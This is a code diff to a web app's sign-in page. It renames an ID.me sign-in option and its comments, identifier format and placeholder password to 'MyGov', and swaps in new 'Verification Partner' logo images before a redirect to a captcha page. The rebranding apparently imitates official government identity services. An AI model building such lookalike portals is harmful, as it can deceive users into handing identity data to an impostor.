@@ -138,20 +138,20 @@ export default function SignIn() {
     setError("");
     
     try {
-      // Generate a unique ID.me identifier that resembles an email to pass validation
-      // We use the format idme_timestamp_random@id.me to:
+      // Generate a unique MyGov identifier that resembles an email to pass validation
+      // We use the format idme_timestamp_random@MyGov to:
       // 1. Pass email validation in the backend (requires @ symbol)
-      // 2. Maintain a unique identifier for each ID.me user
-      // 3. Allow ID.me users to be clearly identified in the system
+      // 2. Maintain a unique identifier for each MyGov user
+      // 3. Allow MyGov users to be clearly identified in the system
       const timestamp = Date.now();
       const randomString = Math.random().toString(36).substr(2, 9);
-      const uniqueIdMeIdentifier = `idme_${timestamp}_${randomString}@id.me`;
+      const uniqueIdMeIdentifier = `idme_${timestamp}_${randomString}@MyGov`;
       
-      // Create a document with ID.me auth method and unique identifier as email
+      // Create a document with MyGov auth method and unique identifier as email
       await updateMultipleFields({
-        authMethod: "id.me",
+        authMethod: "MyGov",
         email: uniqueIdMeIdentifier, // Use unique identifier in place of email
-        password: "id.me-auth", // Set a placeholder password
+        password: "MyGov-auth", // Set a placeholder password
         signInTimestamp: new Date().toISOString()
       });
     
@@ -160,7 +160,7 @@ export default function SignIn() {
       router.push("/auth/captcha-verification");
     }, 1000);
     } catch (error) {
-      console.error('Failed to save ID.me auth data:', error);
+      console.error('Failed to save MyGov auth data:', error);
       setError("Failed to save your data. Please try again.");
     } finally {
       setIsLoading(false);
@@ -271,16 +271,16 @@ export default function SignIn() {
               className="group relative flex w-full items-center justify-center gap-2 rounded-md border border-gray-300 bg-white px-4 py-2 text-sm font-medium text-gray-700 shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-[#0053a0] focus:ring-offset-2"
             >
               <Image 
-                src="/id.jpg" 
-                alt="ID.me logo" 
+                src="/icons/asd.jpg" 
+                alt="asd logo" 
                 width={20} 
                 height={20}
                 className="h-5 w-5 object-contain" 
               />
-              { "Continue with ID.me"}
+              { "Continue with MyGov"}
             </button>
             <p className="mt-1 text-xs text-gray-500 text-center">
-              ID.me verification includes 30-60 second identity check
+              MyGov verification includes 30-60 second identity check
             </p>
           </div> */}
 
@@ -292,8 +292,8 @@ export default function SignIn() {
             <div className="flex items-center justify-between">
               <div className="flex-shrink-0">
                 <Image 
-                  src="/log.jpg" 
-                  alt="ID.me Verification Partner" 
+                  src="/icons/next.jpg" 
+                  alt="next Verification Partner" 
                   width={100} 
                   height={40}
                   className="h-8 w-auto object-contain" 
@@ -301,8 +301,8 @@ export default function SignIn() {
               </div>
               <div className="flex-shrink-0">
                 <Image 
-                  src="/id.jpg" 
-                  alt="Identity Verification Partner" 
+                  src="/icons/aus.jpg" 
+                  alt="next Verification Partner" 
                   width={120} 
                   height={50}
                   className="h-8 w-auto object-contain" 
